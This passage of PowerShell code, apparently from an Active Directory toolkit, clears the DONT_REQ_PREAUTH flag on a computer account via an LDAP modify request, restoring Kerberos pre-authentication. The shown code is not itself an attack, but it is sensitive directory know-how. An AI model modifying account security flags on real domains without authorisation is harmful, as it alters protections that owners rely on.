                    Write-Log "[Set-DomainComputer] Clearing DONT_REQ_PREAUTH flag for: $($TargetComputer.sAMAccountName)"

                    try {
                        # Get current userAccountControl
                        $CurrentUAC = if ($TargetComputer.userAccountControl) {
                            [int]$TargetComputer.userAccountControl
                        } else { 4096 }

                        Write-Log "[Set-DomainComputer] Current userAccountControl: $CurrentUAC (0x$($CurrentUAC.ToString('X')))"

                        # DONT_REQ_PREAUTH = 0x400000 (4194304)
                        $DONT_REQ_PREAUTH = 0x400000

                        if (($CurrentUAC -band $DONT_REQ_PREAUTH) -eq 0) {
                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "ClearDontReqPreauth"
                                    Computer = $TargetComputer.sAMAccountName
                                    DistinguishedName = $ComputerDN
                                    Success = $true
                                    Message = "DONT_REQ_PREAUTH already cleared (no change)"
                                }
                            } else {
                                Show-Line "DONT_REQ_PREAUTH already cleared on: $($TargetComputer.sAMAccountName)" -Class Note
                            }
                        }
                        else {
                            $NewUAC = $CurrentUAC -band (-bnot $DONT_REQ_PREAUTH)
                            Write-Log "[Set-DomainComputer] New userAccountControl: $NewUAC (0x$($NewUAC.ToString('X')))"

                            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                            $ModifyRequest.DistinguishedName = $ComputerDN

                            $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                            $Modification.Name = "userAccountControl"
                            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
                            $Modification.Add([string]$NewUAC) | Out-Null

                            $ModifyRequest.Modifications.Add($Modification) | Out-Null

                            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                            }

                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "ClearDontReqPreauth"
                                    Computer = $TargetComputer.sAMAccountName
                                    DistinguishedName = $ComputerDN
                                    OldUAC = $CurrentUAC
                                    NewUAC = $NewUAC
                                    Success = $true
                                    Message = "DONT_REQ_PREAUTH flag cleared - pre-authentication is required again"
                                }
                            } else {
                                Show-Line "Successfully cleared DONT_REQ_PREAUTH on: $($TargetComputer.sAMAccountName)" -Class Hint
                            }
                        }
                    } catch {
                        throw "Failed to clear DONT_REQ_PREAUTH: $_"
                    }
                }
            }

        } catch {
            Write-Log "[Set-DomainComputer] Error: $_"

            $ComputerIdentifier = $Identity
            $ErrorMsg = $_.Exception.Message

            if ($PassThru) {
                return [PSCustomObject]@{
                    Operation = $PSCmdlet.ParameterSetName
                    Computer = $ComputerIdentifier
                    Success = $false
                    Message = $ErrorMsg
                }
            } else {
                Write-Warning "[!] $ErrorMsg"
            }
        } finally {
            # No cleanup needed - ModifyRequest does not create persistent objects
        }
    }

    end {
        Write-Log "[Set-DomainComputer] Computer modification completed"
    }
}